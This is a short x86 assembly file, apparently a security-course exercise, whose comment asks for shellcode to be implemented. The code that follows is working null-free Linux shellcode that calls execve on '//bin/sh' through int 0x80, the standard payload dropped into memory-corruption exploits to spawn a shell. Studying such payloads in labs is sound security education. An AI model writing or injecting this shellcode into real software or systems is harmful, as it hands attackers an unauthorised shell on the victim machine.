# TODO: implement you shell code with x86 assembly language.
.global main
main:
xor     %eax, %eax
push    %eax
push    $0x68732f6e
push    $0x69622f2f
mov     %esp, %ebx
xor     %ecx, %ecx
xor     %edx, %edx
xor     %eax, %eax
mov     $0xb, %al
int     $0x80
